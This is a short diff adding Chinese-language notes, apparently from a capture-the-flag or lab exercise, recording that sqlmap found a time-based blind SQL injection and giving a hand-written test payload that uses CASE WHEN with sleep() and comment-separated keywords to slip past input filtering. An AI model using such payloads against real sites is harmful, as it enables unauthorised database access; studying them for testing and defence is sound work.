@@ -1,0 +1,3 @@
+首先使用 sqlmap跑一下   确定是   基于时间的盲注  所以  再在输入框中进行测试 过滤什么
+
+playloads = "0'or/**/case/**/when(1=1)then(sleep(1))else(select 2)end/**/or'2'='1" --- 测试 数据
